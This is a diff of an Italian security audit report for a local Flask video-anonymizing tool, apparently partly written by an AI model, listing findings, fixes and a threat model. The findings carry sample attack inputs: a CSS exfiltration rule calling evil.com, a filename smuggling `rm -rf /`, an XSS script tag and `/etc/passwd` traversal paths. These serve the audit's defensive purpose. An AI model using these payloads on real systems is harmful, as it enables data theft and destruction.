@@ -1,237 +1,308 @@
 # Security Audit Report — Person Anonymizer v7.1
 
-**Data**: 2026-03-31
-**Scope**: Tutti i 12 file sorgente del progetto
-**Tipo**: Security Code Review (P0 → P1 → P2)
-**Contesto**: Tool locale Flask senza autenticazione, potenzialmente esposto in rete
+**Data**: 2026-04-01
+**Analista**: Senior Security Engineering (claude-sonnet-4-6)
+**Scope**: Tutti i file sorgente Python e JS del progetto
+**Tipo**: Security Code Review completo (P0 → P1 → P2 + Trust Boundary Analysis)
 
 ---
 
-## Executive Summary
+## Panoramica
 
-Il progetto è stato progettato come tool locale (`127.0.0.1:5000`), e in quel contesto la superficie d'attacco è minima. Tuttavia, se deployato in rete o condiviso via GitHub, presenta **vulnerabilità serie**: path traversal, SSRF via `video_path` controllato dal client, XSS, assenza di autenticazione e security headers. Non ci sono vulnerabilità crittografiche (non c'è crittografia da rompere), ma i problemi di input validation sono multipli.
-
-**Totale finding**: 12 (CRITICAL 2 · HIGH 3 · MEDIUM 4 · LOW 3)
+- **File analizzati**: 12 (7 Python backend, 3 JS frontend, 1 HTML template, 1 requirements.txt)
+- **Vulnerabilità trovate**: CRITICAL 0 · HIGH 1 · MEDIUM 3 · LOW 4
+- **Giudizio complessivo**: Postura di sicurezza solida per un tool locale; le misure esistenti (path traversal check, job_id validation, security headers, sanitizzazione XSS via textContent/createTextNode) sono corrette e deliberate. I problemi residui sono tutti sfruttabili solo in contesti specifici o richiedono configurazioni non default.
 
 ---
 
-## CRITICAL (2 finding)
+## Findings
 
-### Path Traversal via `video_path` — Arbitrary File Read/Process (CWE-22, CWE-918)
-**Location**: `person_anonymizer/web/app.py:120-123`
-**Issue**: L'endpoint `/api/start` riceve `video_path` dal client e lo passa direttamente alla pipeline **senza validazione**:
+### HIGH — Nessuna autenticazione sull'interfaccia web (CWE-306)
+
+**Location**: `person_anonymizer/web/app.py` — tutti gli endpoint (`/api/upload`, `/api/start`, `/api/download`, etc.)
+
+**Issue**: L'app Flask viene avviata in binding su `127.0.0.1:5000` (localhost only), il che la protegge dall'accesso esterno diretto. Tuttavia, non esiste nessun meccanismo di autenticazione. Chiunque sul sistema locale (o via proxy/tunnel deliberato) può:
+- Caricare video arbitrari fino a 10 GB
+- Avviare la pipeline YOLO (CPU/GPU intensiva) quante volte vuole
+- Scaricare qualsiasi output prodotto da qualunque `job_id`
+- Leggere le annotazioni JSON di job altrui se conosce il job_id
+
+**Impact**: Su una macchina multiutente o in ambienti dove localhost è raggiungibile tramite SSRF da altra applicazione, qualunque processo locale può controllare il tool. Il `job_id` è un hex a 12 caratteri (48 bit di entropia), teoricamente enumerabile in un contesto locale con forza bruta rapida.
+
+**Fix**:
+Per uso strettamente personale/single-user la situazione attuale è accettabile, ma documentarla esplicitamente. Per usi condivisi:
+```python
+# Aggiungere in app.py
+import secrets
+
+# Token statico all'avvio (o da variabile d'ambiente)
+API_TOKEN = os.environ.get("ANONYMIZER_TOKEN", secrets.token_urlsafe(32))
+
+def require_auth():
+    token = request.headers.get("X-API-Token") or request.args.get("token")
+    if token != API_TOKEN:
+        return jsonify({"error": "Unauthorized"}), 401
+
+# Applicare a tutti gli endpoint sensibili con before_request
+@app.before_request
+def check_auth():
+    if request.path.startswith("/api/"):
+        return require_auth()
+```
+
+---
+
+### MEDIUM — Path del video inviato dal client a `/api/start` (CWE-610)
+
+**Location**: `person_anonymizer/web/app.py:157-163`
+
+**Issue**: L'endpoint `/api/start` accetta `video_path` come stringa dal corpo JSON del client:
 ```python
 video_path = data.get("video_path")
 if not video_path or not Path(video_path).exists():
     return jsonify({"error": "Video non trovato"}), 404
-```
-Il client invia il path ricevuto dall'upload, ma **niente impedisce di inviare un path arbitrario**. Un attaccante può forzare la pipeline a processare qualsiasi file leggibile dal processo Python, inclusi file di sistema.
-**Impact**: Arbitrary file read (il video viene elaborato e i frame estratti sono accessibili via `/api/review/frame/`). In combinazione con la review web, l'attaccante può estrarre frame JPEG da qualsiasi video sul filesystem.
-**Fix**:
-```diff
-- video_path = data.get("video_path")
-- if not video_path or not Path(video_path).exists():
-+ video_path = data.get("video_path")
-+ if not video_path:
-+     return jsonify({"error": "video_path mancante"}), 400
-+ # Verifica che il path sia dentro UPLOAD_DIR
-+ resolved = Path(video_path).resolve()
-+ if not str(resolved).startswith(str(UPLOAD_DIR.resolve())):
-+     return jsonify({"error": "Path non autorizzato"}), 403
-+ if not resolved.exists():
-      return jsonify({"error": "Video non trovato"}), 404
-```
-**Priority**: P0
 
----
-
-### Path Traversal via `job_id` — Directory Traversal (CWE-22)
-**Location**: `person_anonymizer/web/app.py:96-103, 305-323`
-**Issue**: `job_id` viene usato direttamente nella costruzione di path senza sanitizzazione:
-```python
-job_dir = UPLOAD_DIR / job_id    # Se job_id = "../../etc" → UPLOAD_DIR/../../etc
-job_out = OUTPUT_DIR / job_id     # Stesso problema
+resolved = Path(video_path).resolve()
+if not str(resolved).startswith(str(UPLOAD_DIR.resolve())):
+    return jsonify({"error": "Path non autorizzato"}), 403
 ```
-Negli endpoint `/api/upload-json`, `/api/download/<job_id>/<file_type>`, `/api/outputs/<job_id>`, un `job_id` malevolo come `../../../etc` causa directory traversal.
-**Impact**: Lettura di file arbitrari via download, scrittura di file arbitrari via upload-json.
+La guardia con `startswith` è presente e funzionante. Il problema rimane in `Path(video_path).exists()` che viene chiamato PRIMA della verifica del path. Su filesystem locali con symlink, un path come `/uploads/abc123/../../etc/passwd` risolve e poi fallisce la guardia — ma l'esistenza del file viene verificata prima. Questo non è direttamente exploitabile nella configurazione corrente, ma è un pattern fragile che potrebbe diventare critico se la logica cambia.
+
+**Impact**: La verifica `exists()` su path arbitrario prima della sanitizzazione può essere usata come oracle di esistenza di file locali (information disclosure).
+
 **Fix**:
 ```python
-import re
-def validate_job_id(job_id: str) -> bool:
-    """Verifica che job_id sia un hex string sicuro."""
-    return bool(re.match(r'^[a-f0-9]{12}$', job_id))
+# Invertire l'ordine: prima sanifica, poi verifica esistenza
+video_path = data.get("video_path")
+if not video_path:
+    return jsonify({"error": "video_path mancante"}), 400
+
+resolved = Path(video_path).resolve()
+if not str(resolved).startswith(str(UPLOAD_DIR.resolve())):
+    return jsonify({"error": "Path non autorizzato"}), 403
+
+if not resolved.exists():
+    return jsonify({"error": "Video non trovato"}), 404
 ```
-Applica questa validazione in ogni endpoint che riceve `job_id`.
-**Priority**: P0
 
 ---
 
-## HIGH (3 finding)
+### MEDIUM — `_build_config` accetta parametri non validati da input web (CWE-20)
 
-### XSS via `innerHTML` con filename utente (CWE-79)
-**Location**: `person_anonymizer/web/static/js/app.js:539-544`
-**Issue**: I nomi dei file di output vengono iniettati nel DOM via `innerHTML`:
-```javascript
-item.innerHTML = `
-    <span class="result-name">${f.name}</span>
-    <span class="result-size">${f.size_mb} MB</span>
-    <a href="/api/download/${jid}/${f.type}" ...>Scarica</a>
-`;
+**Location**: `person_anonymizer/web/pipeline_runner.py:18-81`
+
+**Issue**: La funzione `_build_config` mappa direttamente i valori provenienti dal JSON del client su `PipelineConfig` senza validare tipi o range:
+```python
+kwargs[config_key] = val  # val = qualsiasi cosa il client abbia inviato
+return PipelineConfig(**kwargs)
 ```
-Se un filename contiene `<script>alert(1)</script>` o `<img onerror=...>`, viene eseguito nel browser.
-**Impact**: Stored XSS — l'attaccante carica un file con nome malevolo, l'output viene visualizzato con il nome iniettato.
-**Fix**: Usa `document.createElement` + `textContent` per i dati utente:
-```javascript
-const nameSpan = document.createElement("span");
-nameSpan.className = "result-name";
-nameSpan.textContent = f.name;  // textContent è sicuro
+Un client malevolo può inviare, per esempio:
+- `detection_confidence: "../../etc/passwd"` — `PipelineConfig` accetta qualsiasi valore, la validazione avviene solo a runtime nella pipeline YOLO che lancia un'eccezione non gestita
+- `max_refinement_passes: 9999999` — DoS via iterazioni infinite
+- `yolo_model: "/etc/passwd"` — YOLO tenta di caricare quel file come modello (poi fallisce, ma genera un traceback con il path nel messaggio di errore)
+- `sliding_window_grid: -1` — divisione per zero potenziale in `get_window_patches`
+
+**Impact**: DoS locali (iterazioni eccessive), leak parziali di informazioni di sistema via messaggi di errore, comportamento imprevedibile della pipeline.
+
+**Fix**:
+```python
+def _validate_config_params(web_config: dict) -> tuple[bool, str]:
+    """Valida i parametri di configurazione prima di applicarli."""
+    validators = {
+        "detection_confidence": lambda v: isinstance(v, (int, float)) and 0.01 <= v <= 0.99,
+        "nms_iou_threshold": lambda v: isinstance(v, (int, float)) and 0.0 < v < 1.0,
+        "max_refinement_passes": lambda v: isinstance(v, int) and 1 <= v <= 10,
+        "sliding_window_grid": lambda v: isinstance(v, int) and 1 <= v <= 10,
+        "anonymization_intensity": lambda v: isinstance(v, int) and 1 <= v <= 100,
+        "yolo_model": lambda v: isinstance(v, str) and v in {"yolov8x.pt", "yolov8n.pt"},
+        "operation_mode": lambda v: v in {"auto", "manual"},
+        "anonymization_method": lambda v: v in {"pixelation", "blur"},
+    }
+    for key, validator in validators.items():
+        if key in web_config and not validator(web_config[key]):
+            return False, f"Parametro non valido: {key}"
+    return True, ""
 ```
-**Priority**: P1
 
 ---
 
-### XSS via `showToast()` con `innerHTML` (CWE-79)
-**Location**: `person_anonymizer/web/static/js/app.js:67-71`
-**Issue**: La funzione `showToast()` usa `innerHTML` con il parametro `message`:
-```javascript
-toast.innerHTML = `
-    ${TOAST_ICONS[type] || TOAST_ICONS.info}
-    <span class="toast-message">${message}</span>
+### MEDIUM — `debug=False` ma errori YOLO/ffmpeg espongono path locali (CWE-209)
+
+**Location**: `person_anonymizer/web/pipeline_runner.py:333-354`
+
+**Issue**: La gestione delle eccezioni in `_run` è corretta per `Exception` generica (messaggio generico + logging interno). Tuttavia, `SystemExit` viene gestita con:
+```python
+except SystemExit as e:
+    self._sse.emit(job_id, "error", {
+        "message": f"Pipeline terminata con codice {e.code}",
+    })
+```
+Il codice `e.code` può essere una stringa (quando `sys.exit("messaggio")` viene chiamato con argomento stringa), che può contenere il path locale del file in elaborazione: `sys.exit(1)` viene chiamato da `run_pipeline` con precedente print del path. La `StdoutCapture` cattura queste print e le invia come eventi `log` al client, inclusi path del filesystem locale.
+
+**Impact**: Il client riceve i path assoluti del filesystem server (es. `/home/bonn/Documenti/.../uploads/abc123/Camera-Sicurezza.mp4`). In un contesto multi-utente è information disclosure, per un uso puramente locale è accettabile ma non ideale.
+
+**Fix**:
+```python
+# In pipeline_runner.py: filtrare i messaggi di log che contengono path assoluti
+def _sanitize_log_message(msg: str) -> str:
+    """Rimuove path assoluti dai messaggi di log."""
+    import re
+    return re.sub(r'/[^\s]+/uploads/[^\s]+', '[FILE]', msg)
+```
+Oppure, più semplicemente, non emettere stdout capture al client per le righe che iniziano con "Errore:".
+
+---
+
+### LOW — Nessun rate limiting sugli endpoint di upload e start (CWE-770)
+
+**Location**: `person_anonymizer/web/app.py:73-108`, `app.py:145-172`
+
+**Issue**: Non esiste rate limiting su `/api/upload` e `/api/start`. Un client può inviare:
+- Migliaia di richieste di upload per riempire il disco
+- Richieste di avvio pipeline multiple (anche se una guardia impedisce pipeline concorrenti, le richieste rimangono accodate nel thread)
+
+Il limite di 10 GB per singolo file (`MAX_CONTENT_LENGTH`) è presente, ma non limita il numero di upload distinti.
+
+**Impact**: DoS via esaurimento spazio disco o CPU. Accettabile per uso locale single-user, problematico se esposto in rete.
+
+**Fix**: Per uso locale è sufficiente documentare. Per rete, usare `flask-limiter`:
+```python
+from flask_limiter import Limiter
+limiter = Limiter(app, key_func=get_remote_address)
+
+@app.route("/api/upload", methods=["POST"])
+@limiter.limit("10 per minute")
+def upload_video():
     ...
-`;
 ```
-I messaggi di errore dal server (es. `data.error`) vengono passati direttamente a `showToast()` in più punti (righe 205, 247, 341, 425). Se il server include input utente nel messaggio di errore (es. il nome del file), è XSS.
-**Impact**: Reflected XSS tramite messaggi di errore del server.
-**Fix**: Separa l'HTML statico (icone) dal testo dinamico:
-```javascript
-const msgSpan = toast.querySelector(".toast-message");
-msgSpan.textContent = message;  // Sicuro
-```
-**Priority**: P1
 
 ---
 
-### Mancata validazione filename in upload (CWE-22)
-**Location**: `person_anonymizer/web/app.py:71`
-**Issue**: Il filename dell'upload viene usato dopo `Path(f.filename).name`, che rimuove directory traversal (`../`), ma **non sanitizza caratteri speciali** nel nome stesso. Su alcuni filesystem, caratteri come `;`, `|`, `$`, backtick possono essere problematici se il filename viene successivamente usato in un contesto shell (e ffmpeg lo fa via `ffmpeg-python`).
+### LOW — `validate_job_id` usa regex senza limite di lunghezza esplicita (CWE-400)
+
+**Location**: `person_anonymizer/web/app.py:40-44`
+
+**Issue**:
 ```python
-safe_name = Path(f.filename).name  # "video.mp4; rm -rf /" → "video.mp4; rm -rf /"
+def validate_job_id(job_id: str) -> bool:
+    if not job_id:
+        return False
+    return bool(re.match(r"^[a-f0-9]{12}$", job_id))
 ```
-**Impact**: Potenziale command injection se il filename finisce in un contesto shell.
-**Fix**: Usa `werkzeug.utils.secure_filename()`:
+La regex è corretta e usa ancore `^` e `$`. Il problema è che `job_id` non viene limitato prima della regex — un input di 1 MB di caratteri viene passato alla regex prima di verificare la lunghezza. Non è ReDoS (la regex è lineare), ma è un pattern inefficiente per un parametro con lunghezza fissa nota.
+
+**Fix** (difensivo):
 ```python
-from werkzeug.utils import secure_filename
-safe_name = secure_filename(f.filename)
+def validate_job_id(job_id: str) -> bool:
+    if not job_id or len(job_id) != 12:
+        return False
+    return bool(re.match(r"^[a-f0-9]{12}$", job_id))
 ```
-**Priority**: P1
 
 ---
 
-## MEDIUM (4 finding)
+### LOW — File temporanei `.avi` con nome prevedibile (CWE-377)
 
-### Nessun security header (CWE-693)
-**Location**: `person_anonymizer/web/app.py`
-**Issue**: L'applicazione Flask non imposta nessun security header: no CSP, no X-Content-Type-Options, no X-Frame-Options, no HSTS.
-**Impact**: Il browser non ha istruzioni per proteggersi da XSS, clickjacking, MIME sniffing.
-**Fix**: Aggiungi un middleware o usa `flask-talisman`:
+**Location**: `person_anonymizer/person_anonymizer.py:671-672`
+
+**Issue**:
 ```python
-@app.after_request
-def security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['Content-Security-Policy'] = "default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self'"
-    return response
+temp_video_path = str(output_dir / f"{input_stem}_temp_noaudio.avi")
+temp_debug_path = str(output_dir / f"{input_stem}_temp_debug.avi")
 ```
-**Priority**: P2
+Il nome del file temporaneo è deterministico basato sul nome del file di input. In un contesto multi-utente, se due utenti elaborano lo stesso file contemporaneamente, i file temporanei si sovrascrivono. Non è exploitabile come TOCTOU nel contesto attuale (directory per-job), ma è un pattern da evitare.
 
----
-
-### Nessun rate limiting (CWE-770)
-**Location**: Tutti gli endpoint in `app.py`
-**Issue**: `MAX_CONTENT_LENGTH = 10 GB` senza rate limiting. Un attaccante può inviare upload da 10 GB in loop, saturando disco e memoria.
-**Impact**: Denial of Service tramite disk exhaustion.
-**Fix**: Usa `flask-limiter` per limitare le richieste per IP, e riduci `MAX_CONTENT_LENGTH` a un valore ragionevole (es. 2 GB).
-**Priority**: P2
-
----
-
-### `os.chdir()` globale in thread — Race condition (CWE-367)
-**Location**: `person_anonymizer/web/pipeline_runner.py:246, 350`
-**Issue**: `os.chdir()` è un'operazione **process-wide**, non thread-safe. Mentre il thread della pipeline cambia il cwd, i thread Flask che servono richieste HTTP operano con un cwd inaspettato.
-**Impact**: Comportamento imprevedibile per `send_file()` con path relativi, potenziale file serving errato.
-**Fix**: Elimina `os.chdir()` e usa path assoluti per il modello YOLO.
-**Priority**: P2
-
----
-
-### Nessuna autenticazione su endpoint sensibili (CWE-306)
-**Location**: Tutti gli endpoint in `app.py`
-**Issue**: Upload, avvio pipeline, download risultati, modifica annotazioni — tutto accessibile senza autenticazione. Il binding su `127.0.0.1` mitiga il rischio, ma non lo elimina (browser extensions, CSRF da siti malevoli in un contesto same-origin).
-**Impact**: Qualsiasi processo locale o pagina web con accesso a localhost può interagire con l'applicazione.
-**Fix**: Per un tool locale, almeno aggiungi un token di sessione generato all'avvio e verificato in ogni richiesta. Per deployment in rete, implementa autenticazione completa.
-**Priority**: P2
-
----
-
-## LOW (3 finding)
-
-### Errori esposti al client senza filtro
-**Location**: `person_anonymizer/web/pipeline_runner.py:332-340`
-**Issue**: L'eccezione viene convertita in stringa e inviata al client via SSE:
+**Fix**:
 ```python
-except Exception as e:
-    self._sse.emit(job_id, "error", {"message": str(e)})
+import tempfile
+temp_video_path = str(output_dir / f"{input_stem}_temp_{uuid.uuid4().hex[:8]}_noaudio.avi")
 ```
-Alcune eccezioni Python includono path del filesystem, nomi di moduli interni, o dettagli di configurazione.
-**Impact**: Information disclosure — path interni e dettagli implementativi esposti.
-**Fix**: Invia un messaggio generico al client, logga i dettagli internamente.
-**Priority**: P2
 
 ---
 
-### Upload directory non pulita automaticamente
-**Location**: `person_anonymizer/web/app.py:24-27`
-**Issue**: I file caricati in `uploads/` e i risultati in `outputs/` non vengono mai eliminati. Nessun meccanismo di cleanup.
-**Impact**: Disk exhaustion nel tempo, specialmente con video grandi.
-**Fix**: Implementa un cleanup periodico (cron job o background thread) che elimina job più vecchi di N ore.
-**Priority**: P2
+### LOW — Content-Security-Policy con `unsafe-inline` su `style-src` (CWE-1021)
+
+**Location**: `person_anonymizer/web/app.py:52-58`
+
+**Issue**:
+```python
+"Content-Security-Policy": (
+    "default-src 'self'; "
+    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
+    ...
+)
+```
+`unsafe-inline` su `style-src` consente CSS injection via attributo `style`. Se un futuro endpoint riflette input utente in un contesto HTML dove l'attaccante può iniettare attributi di stile, può essere usato per click-jacking o per estrarre dati via CSS exfiltration (es. `input[value^="a"] { background: url(//evil.com/a) }`).
+
+**Impact**: Basso nel contesto attuale (nessun input riflesso in HTML), ma la flag riduce la protezione in profondità della CSP.
+
+**Fix**: Usare `nonce` o `hash` per gli stili inline critici, oppure spostare tutti gli stili inline in un file CSS separato ed eliminare `unsafe-inline`:
+```python
+"style-src 'self' https://fonts.googleapis.com; "
+```
 
 ---
 
-### SSE endpoint senza validazione job_id
-**Location**: `person_anonymizer/web/app.py:140`
-**Issue**: L'endpoint `/api/progress?job_id=X` non valida il formato di `job_id`. Un `job_id` inesistente crea semplicemente una coda vuota che rimane in memoria.
-**Impact**: Memory leak se un attaccante genera migliaia di subscription con job_id casuali.
-**Fix**: Valida il formato `job_id` e rifiuta con 400 se non è un hex di 12 caratteri.
-**Priority**: P2
+## Threat Model (STRIDE)
+
+| Minaccia | Categoria STRIDE | Componente | Mitigazione attuale | Residuo |
+|---|---|---|---|---|
+| Upload di file non-video (eseguibile rinominato .mp4) | Tampering | `/api/upload` | Verifica estensione + `secure_filename`. OpenCV non esegue il file, lo legge come stream binario. | Basso — OpenCV fallisce silenziosamente su file non-video |
+| Path traversal via `video_path` in `/api/start` | Tampering | `/api/start` | `startswith(UPLOAD_DIR)` guard | Path verificato prima della sanitizzazione (vedi MEDIUM sopra) |
+| Enumerazione output di altri job | Information Disclosure | `/api/download/<job_id>` | `job_id` a 48 bit di entropia (hex 12 char) | Basso per uso locale, alto su rete |
+| DoS via upload massivo | Denial of Service | `/api/upload` | `MAX_CONTENT_LENGTH = 10 GB` per singolo file | Nessun limite sul numero di upload |
+| Injection via nomi file malevoli | Tampering | Upload handler | `werkzeug.utils.secure_filename` + `Path().suffix` | Corretto |
+| XSS via messaggi SSE riflessi nel DOM | XSS | `app.js`, SSE handler | `textContent` / `createTextNode` usati correttamente | Nessun rischio residuo |
+| SSRF via YOLO model path | SSRF | `pipeline_runner.py` | `yolo_model` non viene usato come URL; solo come path locale | Non applicabile |
+| Injection comandi via ffmpeg | Command Injection | `postprocessing.py` | `ffmpeg-python` usa `subprocess` con lista di argomenti (non `shell=True`) | Corretto — nessuna injection possibile |
 
 ---
 
-## Checklist di Sicurezza
+## Security Headers Mancanti / Presenti
 
-### P0 — Da fixare PRIMA di qualsiasi merge/deploy
-- [ ] Validare `video_path` contro `UPLOAD_DIR` (path traversal)
-- [ ] Validare `job_id` come hex string di 12 caratteri in tutti gli endpoint
-- [ ] Usare `secure_filename()` per i file uploadati
+| Header | Stato | Note |
+|---|---|---|
+| `X-Content-Type-Options: nosniff` | Presente | Corretto |
+| `X-Frame-Options: DENY` | Presente | Corretto |
+| `Referrer-Policy: strict-origin-when-cross-origin` | Presente | Corretto |
+| `Content-Security-Policy` | Presente | `unsafe-inline` su `style-src` (vedi LOW) |
+| `Strict-Transport-Security` | Assente | Non necessario per localhost HTTP |
+| `Permissions-Policy` | Assente | Consigliato per disabilitare camera/microphone |
+| `Cache-Control` | Assente su risorse statiche | Consigliato `no-store` per output sensibili |
 
-### P1 — Da fixare nel prossimo sprint
-- [ ] Eliminare `innerHTML` con dati utente — usare `textContent` + `createElement`
-- [ ] Sanitizzare messaggi di errore prima di inviarli al frontend
-
-### P2 — Hardening
-- [ ] Aggiungere security headers (CSP, X-Content-Type-Options, X-Frame-Options)
-- [ ] Aggiungere rate limiting sugli endpoint di upload
-- [ ] Eliminare `os.chdir()` e usare path assoluti
-- [ ] Implementare cleanup periodico dei file temporanei
-- [ ] Validare `job_id` nell'endpoint SSE
-- [ ] Aggiungere autenticazione basica (token di sessione)
+**Raccomandazione**: aggiungere `Permissions-Policy: camera=(), microphone=(), geolocation=()` e `Cache-Control: no-store` sugli endpoint `/api/download/*`.
 
 ---
 
-## Nota di contesto
+## Priorità di Remediation
 
-Questo progetto è progettato per uso locale (`127.0.0.1`), il che riduce significativamente la superficie d'attacco. Le vulnerabilità P0 e P1 diventano **critiche solo se l'applicazione viene esposta in rete** o se il repository viene usato come base per un deployment condiviso. Tuttavia, fixare le vulnerabilità P0 è buona pratica anche per uso locale, perché:
+1. **Invertire ordine path check in `/api/start`** (5 min, nessun rischio regressione) — elimina l'oracle di esistenza file locali.
+2. **Aggiungere validazione parametri in `_build_config`** (30 min) — previene DoS via parametri estremi e messaggi di errore informativi.
+3. **Aggiungere lunghezza check prima della regex in `validate_job_id`** (2 min, triviale).
+4. **Documentare esplicitamente il requisito localhost-only** nel README — chiarisce il threat model inteso e previene deployment errati.
+5. **Aggiungere `Permissions-Policy` e `Cache-Control: no-store` su download** (5 min).
 
-1. Le abitudini di sviluppo sicuro si trasferiscono ai progetti futuri
-2. Il binding su localhost non protegge da attacchi originati dal browser (CSRF, DNS rebinding)
-3. Se il progetto finisce su GitHub, qualcuno lo deployerà su `0.0.0.0:5000` senza leggere il README
+---
+
+## Analisi punti di forza (già corretti)
+
+Il progetto presenta diverse misure di sicurezza deliberate e ben implementate che meritano di essere citate:
+
+- **`werkzeug.utils.secure_filename`** usato correttamente su tutti gli upload
+- **Validazione `job_id` con regex rigorosa** `^[a-f0-9]{12}$` su ogni endpoint
+- **Verifica `startswith(UPLOAD_DIR)`** per prevenire path traversal — logica corretta, solo l'ordine delle operazioni va invertito
+- **`ffmpeg-python` senza `shell=True`** — nessuna injection possibile nel comando ffmpeg
+- **`subprocess` con lista argomenti** ovunque nel progetto
+- **XSS assente nel frontend** — `textContent` e `createTextNode` usati sistematicamente in `app.js`; nessun `innerHTML` con dati utente
+- **`debug=False`** in produzione (app.py riga 378)
+- **`MAX_CONTENT_LENGTH = 10 GB`** configurato
+- **Security headers** presenti (`X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `CSP`)
+- **`app.config["MAX_CONTENT_LENGTH"]` configurato** — previene DoS via singolo upload enorme
+- **Nessuna credenziale hardcoded** nel codice sorgente
+- **`.gitignore` robusto** — esclude `.env`, credenziali, video, modelli AI
+
+---
+
+## Verdict
+
+Per un tool di uso locale single-user, la postura di sicurezza è buona. Le misure anti-traversal, anti-injection e anti-XSS sono corrette e deliberate. Il problema principale è l'assenza di autenticazione (architettura scelta consapevolmente per semplicità d'uso) e la validazione incompleta dei parametri di configurazione in ingresso. Prima di qualsiasi esposizione su rete (anche LAN), risolvere almeno i due MEDIUM sulla validazione parametri e sull'ordine del path check.
